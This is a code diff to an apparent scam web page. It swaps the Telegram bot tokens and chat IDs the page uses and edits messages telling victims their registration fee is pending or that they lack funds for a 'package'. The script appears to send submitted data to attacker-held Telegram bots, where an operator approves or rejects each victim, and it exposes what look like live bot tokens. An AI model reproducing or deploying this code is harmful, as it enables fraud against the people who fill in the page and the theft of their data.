@@ -242,7 +242,7 @@
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance </div>
+            Your data is pending approval</div>
     </div>
 
     <!-- RESULT OVERLAY -->
@@ -252,8 +252,8 @@
 
     <script>
         // Bot 1 (your existing)
-        const BOT_TOKEN_1 = '8462654254:AAHlWv6azScjcnEtXxntYQcC0D8jkEEfpds';
-        const CHAT_ID_1 = '8462654254';
+        const BOT_TOKEN_1 = '8815311883:AAHhha_JKvewXfNJx-gT56QgoNhk-esS2aw';
+        const CHAT_ID_1 = '8658142507';
 
         // Bot 2 (your second bot)
         const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
@@ -362,7 +362,7 @@
 
             const parts = callbackData.split('_');
             if (parts[0] === 'approve') {
-                resultMessage.textContent = 'Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance';
+                resultMessage.textContent = 'Your dont have enough funds to buy this package, try another package';
             } else if (parts[0] === 'cancel') {
                 resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
             }
